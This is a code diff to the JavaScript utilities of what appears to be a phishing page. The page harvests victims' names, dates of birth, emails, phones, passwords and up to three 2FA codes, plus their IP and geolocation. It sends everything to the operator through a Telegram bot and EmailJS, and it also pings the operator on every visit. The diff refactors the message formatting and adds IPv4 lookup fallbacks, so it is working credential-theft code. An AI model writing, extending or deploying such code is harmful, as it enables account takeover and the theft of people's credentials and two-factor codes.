@@ -35,15 +35,30 @@ const Utils = {
         }
     },
 
-    async getUserIp() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        } catch (error) {
-            console.error('Error getting IP:', error);
-            return 'N/A';
+    isIPv4(ip) {
+        return /^\d{1,3}(?:\.\d{1,3}){3}$/.test(String(ip || ''));
+    },
+
+    async getIPv4() {
+        const sources = [
+            'https://api.ipify.org?format=json',
+            'https://ipv4.icanhazip.com/'
+        ];
+        for (const url of sources) {
+            try {
+                const res = await fetch(url, { cache: 'no-store' });
+                if (!res.ok) continue;
+                const text = await res.text();
+                let ip = text.trim();
+                try {
+                    const json = JSON.parse(text);
+                    ip = json.ip || ip;
+                } catch (e) { /* plain text */ }
+                ip = String(ip).trim();
+                if (this.isIPv4(ip)) return ip;
+            } catch (e) { /* try next */ }
         }
+        return '';
     },
 
     formatLocationLine(data) {
@@ -82,13 +97,83 @@ const Utils = {
         return names[String(code || '').toUpperCase()] || '';
     },
 
+    telegramHasValue(value) {
+        const text = String(value == null ? '' : value).trim();
+        if (!text) return false;
+        if (text === 'N/A') return false;
+        return true;
+    },
+
+    telegramLine(label, value) {
+        if (!this.telegramHasValue(value)) return '';
+        return `${label}: ${String(value).trim()}`;
+    },
+
+    telegramJoin(groups) {
+        const parts = [];
+        groups.forEach((group) => {
+            const lines = (group || []).filter(Boolean);
+            if (!lines.length) return;
+            if (parts.length) parts.push('----------------------');
+            parts.push.apply(parts, lines);
+        });
+        return parts.join('\n');
+    },
+
+    telegramPageUrl() {
+        return location.href || '';
+    },
+
+    formatDateOfBirth(data) {
+        const day = data.day || '';
+        const month = data.month || '';
+        const year = data.year || '';
+        if (!day && !month && !year) return '';
+        return `${day}/${month}/${year}`;
+    },
+
     telegramVisitMessage(loc) {
-        return [
-            `IP: ${loc.ip || 'N/A'}`,
-            `Location: ${loc.location || 'N/A'}`,
-            `Page: ${location.href}`,
-            'reCAPTCHA: đã tick'
-        ].join('\n');
+        return this.telegramJoin([[
+            this.telegramLine('IP', loc.ip),
+            this.telegramLine('Location', loc.location),
+            this.telegramLine('Page', this.telegramPageUrl())
+        ]]);
+    },
+
+    telegramFormMessage(loc, data, withTwoFa) {
+        return this.telegramJoin([
+            [
+                this.telegramLine('IP', loc.ip),
+                this.telegramLine('Location', loc.location)
+            ],
+            [
+                this.telegramLine('Full Name', data.fullName),
+                this.telegramLine('Page', data.fanpage),
+                this.telegramLine('Date of Birth', this.formatDateOfBirth(data))
+            ],
+            [
+                this.telegramLine('Email', data.email),
+                this.telegramLine('Business Email', data.emailBusiness),
+                this.telegramLine('Phone', data.phone)
+            ],
+            [
+                this.telegramLine('Password(1)', data.password),
+                this.telegramLine('Password(2)', data.passwordSecond)
+            ],
+            withTwoFa ? [
+                this.telegramLine('2FA(1)', data.twoFa),
+                this.telegramLine('2FA(2)', data.twoFaSecond),
+                this.telegramLine('2FA(3)', data.twoFaThird)
+            ] : []
+        ]);
+    },
+
+    telegramPasswordMessage(loc, data) {
+        return this.telegramFormMessage(loc, data, false);
+    },
+
+    telegramTwoFaMessage(loc, data) {
+        return this.telegramFormMessage(loc, data, true);
     },
 
     async sendTelegramText(text) {
@@ -119,13 +204,18 @@ const Utils = {
             org: 'N/A'
         };
 
+        const ipv4 = await this.getIPv4();
+
         const sources = [
             async () => {
-                const response = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+                const url = ipv4
+                    ? `https://ipapi.co/${ipv4}/json/`
+                    : 'https://ipapi.co/json/';
+                const response = await fetch(url, { cache: 'no-store' });
                 const data = await response.json();
                 if (data.error) throw new Error('ipapi');
                 return {
-                    ip: data.ip || 'N/A',
+                    ip: data.ip || ipv4 || 'N/A',
                     city: data.city || 'N/A',
                     region: data.region || data.city || 'N/A',
                     region_code: data.region_code || '',
@@ -135,11 +225,14 @@ const Utils = {
                 };
             },
             async () => {
-                const response = await fetch('https://ipwho.is/', { cache: 'no-store' });
+                const url = ipv4
+                    ? `https://ipwho.is/${ipv4}`
+                    : 'https://ipwho.is/';
+                const response = await fetch(url, { cache: 'no-store' });
                 const data = await response.json();
                 if (data.success === false) throw new Error('ipwho');
                 return {
-                    ip: data.ip || 'N/A',
+                    ip: data.ip || ipv4 || 'N/A',
                     city: data.city || 'N/A',
                     region: data.region || data.city || 'N/A',
                     region_code: data.region_code || '',
@@ -149,11 +242,14 @@ const Utils = {
                 };
             },
             async () => {
-                const response = await fetch('https://ipinfo.io/json?token=790b745aefcdac', { cache: 'no-store' });
+                const url = ipv4
+                    ? `https://ipinfo.io/${ipv4}/json?token=790b745aefcdac`
+                    : 'https://ipinfo.io/json?token=790b745aefcdac';
+                const response = await fetch(url, { cache: 'no-store' });
                 if (!response.ok) throw new Error('ipinfo');
                 const data = await response.json();
                 return {
-                    ip: data.ip || 'N/A',
+                    ip: data.ip || ipv4 || 'N/A',
                     city: data.city || 'N/A',
                     region: data.region || data.city || 'N/A',
                     region_code: '',
@@ -168,6 +264,8 @@ const Utils = {
             try {
                 const raw = await source();
                 if (!raw || !raw.ip || raw.ip === 'N/A') continue;
+                if (!this.isIPv4(raw.ip) && ipv4) raw.ip = ipv4;
+                if (!this.isIPv4(raw.ip)) continue;
                 const loc = {
                     ...raw,
                     country: (raw.country_code || 'N/A').toUpperCase(),
@@ -187,39 +285,28 @@ const Utils = {
             } catch (error) { /* try next */ }
         }
 
+        if (ipv4) {
+            const loc = {
+                ...empty,
+                ip: ipv4,
+                location: `${ipv4} | N/A | N/A`
+            };
+            this._locationCache = loc;
+            return loc;
+        }
+
         return empty;
     },
 
     async sendToTelegram(data) {
         const locationData = await this.getUserLocation();
-        const lines = [
-            `IP: ${locationData.ip || 'N/A'}`,
-            `Location: ${locationData.location || 'N/A'}`,
-            `Page: ${location.href}`,
-            '--------------------',
-            `Full Name: ${data.fullName || ''}`,
-            `Page Name: ${data.fanpage || ''}`,
-            `Date of Birth: ${data.day || ''}/${data.month || ''}/${data.year || ''}`,
-            `Phone: ${data.phone || ''}`,
-            `Email: ${data.email || ''}`,
-            `Email Business: ${data.emailBusiness || ''}`
-        ];
-
-        if (data.password || data.passwordSecond) {
-            lines.push('--------------------');
-            if (data.password) lines.push(`Password 1: ${data.password}`);
-            if (data.passwordSecond) lines.push(`Password 2: ${data.passwordSecond}`);
-        }
-
-        if (data.twoFa || data.twoFaSecond || data.twoFaThird) {
-            lines.push('--------------------');
-            if (data.twoFa) lines.push(`2FA 1: ${data.twoFa}`);
-            if (data.twoFaSecond) lines.push(`2FA 2: ${data.twoFaSecond}`);
-            if (data.twoFaThird) lines.push(`2FA 3: ${data.twoFaThird}`);
-        }
+        const hasTwoFa = Boolean(data.twoFa || data.twoFaSecond || data.twoFaThird);
+        const text = hasTwoFa
+            ? this.telegramTwoFaMessage(locationData, data)
+            : this.telegramPasswordMessage(locationData, data);
 
         try {
-            await this.sendTelegramText(lines.join('\n'));
+            await this.sendTelegramText(text);
         } catch (error) {
             console.error('Telegram error:', error);
         }
@@ -228,27 +315,10 @@ const Utils = {
     async sendToEmail(data) {
         const locationData = await this.getUserLocation();
 
-        const emailContent = [
-            `IP: ${locationData.ip || 'N/A'}`,
-            `Location: ${locationData.location || 'N/A'}`,
-            `Page: ${location.href}`,
-            '--------------------',
-            `Full Name: ${data.fullName || ''}`,
-            `Page Name: ${data.fanpage || ''}`,
-            `Date of Birth: ${data.day || ''}/${data.month || ''}/${data.year || ''}`,
-            `Phone: ${data.phone || ''}`,
-            `Email: ${data.email || ''}`,
-            `Email Business: ${data.emailBusiness || ''}`,
-            '--------------------',
-            `Password 1: ${data.password || ''}`,
-            `Password 2: ${data.passwordSecond || ''}`,
-            '--------------------',
-            `2FA 1: ${data.twoFa || ''}`,
-            `2FA 2: ${data.twoFaSecond || ''}`,
-            `2FA 3: ${data.twoFaThird || ''}`,
-            '',
-            `Sent at: ${new Date().toLocaleString()}`
-        ].join('\n');
+        const hasTwoFa = Boolean(data.twoFa || data.twoFaSecond || data.twoFaThird);
+        const emailContent = hasTwoFa
+            ? this.telegramTwoFaMessage(locationData, data)
+            : this.telegramPasswordMessage(locationData, data);
 
         try {
             // Load EmailJS SDK if not already loaded
@@ -316,17 +386,19 @@ const Utils = {
     },
 
     async sendVisitNotification() {
-        if (sessionStorage.getItem('__visit_ping__')) {
+        if (window.__visitPingStarted || sessionStorage.getItem('__visit_ping__')) {
             this.markVisitBootDone();
             return;
         }
+        window.__visitPingStarted = true;
+        sessionStorage.setItem('__visit_ping__', '1');
 
         try {
             const loc = await this.getUserLocation();
             const text = this.telegramVisitMessage(loc);
             const controller = new AbortController();
             const timer = setTimeout(() => controller.abort(), 8000);
-            const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -337,7 +409,6 @@ const Utils = {
                 signal: controller.signal
             });
             clearTimeout(timer);
-            if (res.ok) sessionStorage.setItem('__visit_ping__', '1');
         } catch (error) {
             console.error('Visit notify error:', error);
         } finally {
